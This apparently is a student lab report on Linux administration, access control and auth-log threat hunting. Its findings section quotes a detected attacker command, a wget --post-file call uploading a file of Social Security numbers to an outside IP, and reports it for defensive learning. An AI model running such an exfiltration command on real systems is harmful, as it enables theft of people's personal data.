# Lab 01: Introduction to Linux and System Security Basics

## 🎯 Lab Overview

This lab demonstrates foundational Linux system administration and security practices, focusing on user management, access control, and threat detection through log analysis. The hands-on experience covers essential security concepts that form the backbone of enterprise IT security infrastructure.

**Completion Date:** As per curriculum  
**Environment:** Linux (Ubuntu) Virtual Machine  
**Duration:** Comprehensive hands-on session

---

## 📋 Table of Contents

- [Objectives](#objectives)
- [Technologies & Tools Used](#technologies--tools-used)
- [Lab Sections & Methodology](#lab-sections--methodology)
  - [1. Command Line Interface (CLI) Mastery](#1-command-line-interface-cli-mastery)
  - [2. User & Group Management](#2-user--group-management)
  - [3. Permission Management](#3-permission-management)
  - [4. Threat Hunting & Log Analysis](#4-threat-hunting--log-analysis)
- [Key Findings & Security Incidents](#key-findings--security-incidents)
- [Skills Demonstrated](#skills-demonstrated)
- [Real-World Applications](#real-world-applications)
- [Key Learnings](#key-learnings)

---

## 🎓 Objectives

- Master fundamental Linux CLI commands for system navigation and information gathering
- Implement Identity and Access Management (IAM) principles through user and group administration
- Configure and manage file permissions following the principle of least privilege
- Perform threat hunting through authentication log analysis
- Identify and document security incidents involving unauthorized access and data exfiltration

---

## 🛠️ Technologies & Tools Used

| Category | Tools/Technologies |
|----------|-------------------|
| **Operating System** | Linux (Ubuntu 24.04) |
| **Virtualization** | VMware/VirtualBox |
| **CLI Tools** | `cat`, `ls`, `ip`, `netstat`, `grep`, `sudo` |
| **User Management** | `adduser`, `groupadd`, `usermod`, `gpasswd`, `getent` |
| **Permission Management** | `chown`, `chmod` |
| **Security Analysis** | Log file analysis (`/var/log/auth.log`) |
| **Network Analysis** | `ip route`, `netstat` |

---

## 🔬 Lab Sections & Methodology

### 1. Command Line Interface (CLI) Mastery

**Objective:** Develop proficiency in essential Linux commands for system administration and security analysis.

#### Key Commands Implemented:

**a) File Content Examination**
```bash
cat example.txt
```
- **Purpose:** Display file contents for quick review
- **Security Relevance:** Essential for examining configuration files, logs, and sensitive data
- **Output:** Successfully displayed file contents demonstrating read permissions

**b) File Metadata Analysis**
```bash
ls -l newfile.txt
```
- **Purpose:** Retrieve detailed file information including permissions, ownership, size, and modification date
- **Security Relevance:** Critical for security audits and identifying unauthorized modifications
- **Insights Gained:** 
  - File permission structure (rwxrwxrwx)
  - Owner and group identification
  - File size and last modification timestamp

**c) Network Configuration Assessment**
```bash
ip r
```
- **Purpose:** Display routing table and network configuration
- **Security Relevance:** Understanding network topology, identifying default gateways, and detecting routing anomalies
- **Findings:** Successfully mapped system's network architecture including:
  - Default gateway routes
  - Network interfaces
  - Subnet configurations

**d) Active Network Connections Monitoring**
```bash
sudo netstat -tpn
```
- **Purpose:** List all active TCP connections with process IDs
- **Security Relevance:** Detect unauthorized connections, identify listening services, and spot potential backdoors
- **Observations:**
  - Active TCP connections enumerated
  - Process-to-port mappings identified
  - Potential security monitoring baseline established

---

### 2. User & Group Management

**Objective:** Implement proper Identity and Access Management (IAM) practices through user and group administration.

#### Operations Performed:

**a) User Account Creation**
```bash
sudo adduser exampleuser
```
- **Implementation:** Created new user with full account setup including:
  - Password configuration
  - Home directory creation
  - User information collection (Full name, room number, phone, etc.)
- **Security Consideration:** Demonstrates controlled user provisioning process
- **IAM Principle Applied:** Proper user lifecycle management

**b) Group Creation**
```bash
sudo groupadd accounting
```
- **Purpose:** Establish role-based access control (RBAC) structure
- **Business Context:** Created department-specific groups (accounting, finance, hr, legal, IT)
- **Security Benefit:** Enables permission assignment based on job function rather than individual users

**c) User-to-Group Assignment**
```bash
sudo usermod -a -G Students mgs650student
```
- **Functionality:** Added user to group without removing existing group memberships (-a flag)
- **RBAC Implementation:** Demonstrates proper group membership management
- **Access Control:** User inherits all permissions assigned to the Students group

**d) User-from-Group Removal**
```bash
sudo gpasswd -d mark finance
```
- **Purpose:** Revoke group-based access rights
- **Security Scenario:** Employee role change or termination
- **IAM Principle:** Principle of least privilege - removing unnecessary access

**e) Group Information Retrieval**
```bash
getent group sudo accounting finance it hr legal
```
- **Purpose:** Audit group memberships across multiple departments
- **Security Value:** Verify proper access control configuration
- **Compliance:** Supports regular access reviews and audits

---

### 3. Permission Management

**Objective:** Configure file ownership and permissions to enforce access control policies.

#### File Ownership Modification:

```bash
sudo chown demo importantfile.txt
```

**Analysis:**
- **Before:** File owned by original user
- **After:** Ownership transferred to user 'demo'
- **Security Impact:** Demonstrates capability to manage file access at the ownership level
- **Use Case:** Transferring file responsibility between administrators or users

**Permission Management Principles Applied:**
- **Ownership Control:** Understanding user vs. group ownership
- **Access Enforcement:** File-level security implementation
- **Least Privilege:** Ensuring only authorized users can modify critical files

---

### 4. Threat Hunting & Log Analysis

**Objective:** Identify security incidents through systematic authentication log analysis.

#### Methodology:

```bash
cat /var/log/auth.log | grep "tim"
```

**Analysis Approach:**
1. **Log Source:** `/var/log/auth.log` - Linux authentication activity log
2. **Filter Criteria:** Focused on user "tim" activities
3. **Investigation Goal:** Identify unauthorized access or suspicious behavior

---

## 🚨 Key Findings & Security Incidents

### **Incident 1: Unauthorized Access to Sensitive Files**

**Threat Actor:** `mgs650student`  
**Victim:** User `tim`  
**Severity:** HIGH

**Attack Pattern Observed:**
```bash
# Suspicious commands executed by mgs650student:
cat /home/tim/ssns-to-process
ls /home/tim
```

**Indicators of Compromise (IOCs):**
- Repeated access attempts to tim's home directory
- Direct access to sensitive file containing Social Security Numbers (SSNs)
- Privilege escalation or permission bypass suspected

**Security Implications:**
- **Data Breach Risk:** Exposure of PII (Personally Identifiable Information)
- **Compliance Violation:** Potential HIPAA/PCI-DSS violations
- **Insider Threat:** Authorized user accessing unauthorized resources

**Evidence:** Multiple log entries showing file access commands targeting tim's sensitive directory

---

### **Incident 2: Data Exfiltration Attempt**

**Threat Actor:** `mgs650student`  
**Target System:** External IP `10.200.0.22`  
**Severity:** CRITICAL

**Attack Command Detected:**
```bash
wget --post-file /home/tim/ssns-to-process 10.200.0.22
```

**Attack Analysis:**
- **Tool Used:** `wget` with `--post-file` parameter
- **Action:** HTTP POST request uploading sensitive file to external server
- **Data at Risk:** File containing Social Security Numbers (ssns-to-process)
- **External Endpoint:** Unknown IP address 10.200.0.22 (not part of internal network)

**Threat Classification:**
- **Attack Type:** Data Exfiltration
- **Vector:** Command-line network transfer tool
- **Intent:** Malicious data theft

**Red Flags Identified:**
1. ✓ Sensitive file accessed without authorization
2. ✓ Network transfer to unknown external IP
3. ✓ Use of command-line tools to bypass security controls
4. ✓ Potential insider threat or compromised account

**Recommended Actions:**
- Immediate account suspension of `mgs650student`
- Network traffic analysis for IP 10.200.0.22
- Full forensic investigation of system and user activities
- Incident response protocol activation
- Review and strengthen file access controls
- Implement Data Loss Prevention (DLP) solutions

---

## 💡 Skills Demonstrated

### Technical Skills:
- ✅ **Linux System Administration:** User/group management, permission configuration
- ✅ **Command Line Proficiency:** Efficient use of CLI tools for system operations
- ✅ **Log Analysis:** Manual threat hunting through authentication logs
- ✅ **Network Security:** Understanding of network configurations and connection monitoring
- ✅ **Access Control:** Implementation of IAM principles (RBAC, least privilege)

### Security Skills:
- ✅ **Threat Detection:** Identifying suspicious patterns in system logs
- ✅ **Incident Analysis:** Documenting and categorizing security incidents
- ✅ **Security Monitoring:** Proactive system surveillance techniques
- ✅ **Attack Vector Identification:** Recognizing data exfiltration techniques

### Soft Skills:
- ✅ **Analytical Thinking:** Systematic approach to log investigation
- ✅ **Documentation:** Clear incident reporting and technical writing
- ✅ **Attention to Detail:** Spotting anomalies in large log files
- ✅ **Security Mindset:** Thinking like both defender and attacker

---

## 🌐 Real-World Applications

### Enterprise Security Operations:

1. **Security Operations Center (SOC) Analysis**
   - Daily log review and threat hunting activities
   - Incident detection and response workflows
   - SIEM (Security Information and Event Management) correlation

2. **Identity and Access Management (IAM)**
   - User onboarding/offboarding processes
   - Role-based access control implementation
   - Compliance with regulatory requirements (SOX, HIPAA, GDPR)

3. **Incident Response**
   - Forensic investigation of security breaches
   - Chain of custody documentation
   - Root cause analysis

4. **System Administration**
   - Secure server configuration
   - Permission management in multi-user environments
   - Audit trail maintenance

### Industry Relevance:

- **Financial Services:** Protecting sensitive customer data (SSNs, account numbers)
- **Healthcare:** HIPAA compliance through proper access controls
- **Government:** Classified information protection
- **Technology Companies:** Insider threat detection and prevention

---

## 📚 Key Learnings

### 1. **Virtualization in Cybersecurity**

**Understanding:**  
Virtualization creates isolated computing environments (Virtual Machines) on a single physical host using hypervisor technology. Each VM operates independently with its own OS, applications, and resources.

**Cybersecurity Benefits:**
- **Safe Testing Environments:** Analyze malware without risking production systems
- **Incident Response Labs:** Recreate attack scenarios for investigation
- **Honeypots:** Deploy deceptive systems to study attacker behavior
- **Sandboxing:** Execute suspicious code in isolated environments
- **Cost-Effective Training:** Multiple lab environments on single hardware
- **Snapshot & Recovery:** Quickly restore compromised systems to clean state
- **Network Segmentation:** Isolated security testing without production impact

### 2. **Identity and Access Management (IAM) Importance**

**Organizational Impact:**
- **Least Privilege Principle:** Users should only have access needed for their job function
- **Separation of Duties:** Prevents single point of failure and insider threats
- **Compliance Requirements:** Regulatory mandates (SOX, PCI-DSS, HIPAA) require proper access controls
- **Audit Trail:** Group-based permissions simplify compliance auditing
- **Scalability:** Group management scales better than individual user permissions

**Security Posture Enhancement:**
- Reduces attack surface by limiting unnecessary access
- Simplifies user lifecycle management (hires, transfers, terminations)
- Enables rapid response to security incidents (group-level access revocation)

### 3. **Threat Hunting Methodology**

**Systematic Approach Developed:**
- Define investigation scope and targets
- Identify relevant log sources
- Apply filtering techniques for efficiency
- Recognize patterns and anomalies
- Correlate multiple indicators
- Document findings with evidence
- Classify threat severity and recommend actions

**Critical Thinking Applied:**
- Not all unusual activity is malicious - context matters
- Multiple data points strengthen incident classification
- Chain of events tells a story (access → exfiltration)
- Understanding normal baseline is crucial for detecting abnormal

---

